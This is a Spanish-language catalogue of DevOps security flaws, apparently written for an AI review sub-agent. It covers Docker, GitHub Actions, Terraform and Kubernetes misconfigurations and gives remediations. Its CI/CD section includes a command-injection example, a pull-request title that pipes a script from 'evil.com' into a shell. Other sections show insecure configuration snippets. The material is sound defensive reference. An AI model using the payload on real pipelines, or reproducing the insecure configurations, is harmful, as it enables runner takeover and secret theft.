# Catálogo de Vulnerabilidades — DevOps / Infraestructura

> Referencia para el sub-agente de análisis DevOps. Mapeado a OWASP Top 10 (2021) y CWE, adaptado a
> revisión estática de archivos de infraestructura y pipeline (sin ejecución). Cada hallazgo debe
> citar el CWE correspondiente para trazabilidad. Ver también `catalogo-backend.md` y
> `catalogo-frontend.md`.

## Dockerfile / Contenedores Inseguros
- **CWE:** CWE-250 (privilegios innecesarios), CWE-798 (secretos en capas de imagen) · **OWASP:** A05:2021 · **Referencia:** CIS Docker Benchmark
- **Indicador:**
  - Sin instrucción `USER` (corre como root por defecto).
  - Secretos pasados por `ARG`/`ENV` (quedan en el historial de capas de la imagen aunque se borren en una capa posterior — `docker history` los expone).
  - Imagen base con tag mutable (`:latest`) en vez de versión/digest fijo, o de un registro no confiable.
  - `COPY . .` sin `.dockerignore` que arrastra `.env`/`.git` al build context.
  - `docker run`/`docker-compose` sin `--read-only` (filesystem raíz escribible innecesariamente), sin `--no-new-privileges` (permite escalar privilegios dentro del contenedor), montando `/var/run/docker.sock` dentro de un contenedor (control total del daemon Docker del host), o montando directorios sensibles del host (`/etc`, `/var/lib/docker`).
  - Sin límites de recursos (`--memory`, `--cpus`), permitiendo que un contenedor agote recursos del host.
- **Ejemplo vulnerable:** `ARG DB_PASSWORD` seguido de `RUN echo $DB_PASSWORD > /tmp/x && rm /tmp/x` — el valor queda en la capa intermedia igual.
- **Remediación:** `USER node` (o equivalente no-root) antes del `CMD`/`ENTRYPOINT`; secretos vía `--secret` de BuildKit o inyectados en runtime, nunca `ARG`/`ENV`; pinear la imagen base por digest o versión exacta desde un registro confiable; `.dockerignore` explícito; `--read-only` + volúmenes específicos para lo que sí necesita escribir; `--no-new-privileges`; nunca montar el socket de Docker en un contenedor de aplicación; límites explícitos de memoria/CPU.
- **Severidad típica:** Alta (root en contenedor, socket de Docker montado) a Crítica (secreto real expuesto en capas).

## CI/CD Pipeline Inseguro
- **CWE:** CWE-94 (inyección de código vía contexto no confiable), CWE-1357 (dependencia de build no verificada) · **OWASP:** A05:2021 · **Referencia:** GitHub Actions Security Hardening Guide, OWASP GitHub Actions Cheat Sheet
- **Indicador:**
  - Paso `run:` que interpola directamente un valor controlado por el atacante (`${{ github.event.issue.title }}`, `${{ github.event.pull_request.title }}`, nombre de rama) sin pasar por una variable de entorno intermedia — permite inyección de comandos en el runner.
  - Triggers `pull_request_target`/`workflow_run` que hacen checkout del código de un fork y lo ejecutan con los secrets del repo base.
  - Permisos de token por defecto sin restringir (`permissions: write-all` o ausencia de bloque `permissions`, dando `GITHUB_TOKEN` con más alcance del necesario).
  - Action de terceros referenciada por tag mutable (`uses: some/action@v3` o `@main`) en vez de un commit SHA fijo — vector real de supply-chain (ej. CVE-2025-30066, compromiso de `tj-actions/changed-files` vía re-apuntado de tag).
- **Ejemplo vulnerable:** `run: echo "${{ github.event.pull_request.title }}"` — un PR con título `"; curl evil.com/x.sh | sh #` ejecuta el comando en el runner.
- **Remediación:** Pasar valores no confiables como variable de entorno (`env: TITLE: ${{ ... }}`) y referenciarla como `$TITLE` dentro del script, nunca interpolar `${{ }}` directo en `run:`; evitar `pull_request_target` con checkout de código del fork salvo que sea estrictamente necesario y sin exponer secrets; declarar `permissions:` mínimos explícitos por job; pinear toda action de terceros por commit SHA completo (`uses: owner/repo@<sha-completo>`), nunca por tag o rama.
- **Severidad típica:** Crítica (ejecución de código arbitrario en el runner, con acceso potencial a secrets del repo).

## Infraestructura como Código Insegura (Cloud / Terraform)
- **CWE:** CWE-284 (control de acceso inapropiado), CWE-312 (state file con datos sensibles) · **OWASP:** A05:2021 · **Referencia:** hallazgos más comunes de tfsec/Checkov
- **Indicador:**
  - Security group / ingress abierto a `0.0.0.0/0` en puertos administrativos (22, 3389) o de base de datos (3306, 5432, 27017).
  - Bucket de almacenamiento (S3/GCS/Blob) sin bloqueo de acceso público (`block_public_access`), sin cifrado, sin versionado ni logging de acceso.
  - IAM policy con `Action: "*"` o `Resource: "*"` en vez de permisos mínimos por acción/recurso.
  - Backend de estado de Terraform sin cifrado, o el archivo `.tfstate` commiteado al repo (contiene valores sensibles en texto plano, incluyendo secrets/outputs).
- **Ejemplo vulnerable:** `ingress { from_port = 22, cidr_blocks = ["0.0.0.0/0"] }` en un `security_group` de Terraform.
- **Remediación:** Restringir `cidr_blocks` a rangos conocidos (VPN, IPs de oficina); políticas IAM con permisos mínimos explícitos; `block_public_access` + cifrado + versionado en cualquier bucket; backend de estado remoto cifrado con acceso restringido por IAM, nunca `.tfstate` en el repo; correr `tfsec`/`checkov` en CI antes de aplicar.
- **Severidad típica:** Alta-Crítica (depende del recurso expuesto).

## Kubernetes Inseguro
- **CWE:** CWE-250 (privilegios innecesarios), CWE-284 · **OWASP:** A05:2021 · **Referencia:** Pod Security Standards (perfil Restricted), CIS Kubernetes Benchmark
- **Indicador:**
  - Manifiesto sin `securityContext`, o con `privileged: true`, `allowPrivilegeEscalation: true`, o sin `runAsNonRoot: true`.
  - Sin `readOnlyRootFilesystem: true` cuando el contenedor no necesita escribir en su filesystem raíz.
  - Sin `drop: ["ALL"]` en `capabilities` (el contenedor conserva capabilities de Linux que no necesita).
  - `Secret` de Kubernetes en texto plano commiteado en el manifiesto en vez de referenciar un secrets manager externo (external-secrets-operator, Vault, Sealed Secrets).
  - RBAC con `ClusterRole`/`Role` que otorga `*` en `verbs`/`resources`, o `ServiceAccount` de un pod con más permisos de los que ese pod necesita.
- **Ejemplo vulnerable:** manifiesto de `Deployment` sin bloque `securityContext` en el contenedor.
- **Remediación:** `securityContext: { runAsNonRoot: true, allowPrivilegeEscalation: false, readOnlyRootFilesystem: true, capabilities: { drop: ["ALL"] } }` como base (perfil Restricted de Pod Security Standards); RBAC con permisos mínimos explícitos por verbo/recurso; secretos vía external-secrets-operator/Vault/Sealed Secrets en vez de `Secret` plano en el repo.
- **Severidad típica:** Alta-Crítica (depende de si el cluster es multi-tenant y de qué permisos tiene el `ServiceAccount`).

## Fuera de Alcance
- Ver `catalogo-backend.md` sección "Fuera de Alcance" (Insecure Design/lógica de negocio, ReDoS).
- Esta skill no ejecuta `docker build`, no corre el pipeline, no hace scan de imágenes ya construidas (Trivy/Grype) ni consulta CVE en línea de imágenes base — solo lee el `Dockerfile`/YAML/`.tf` tal como está en el repo.
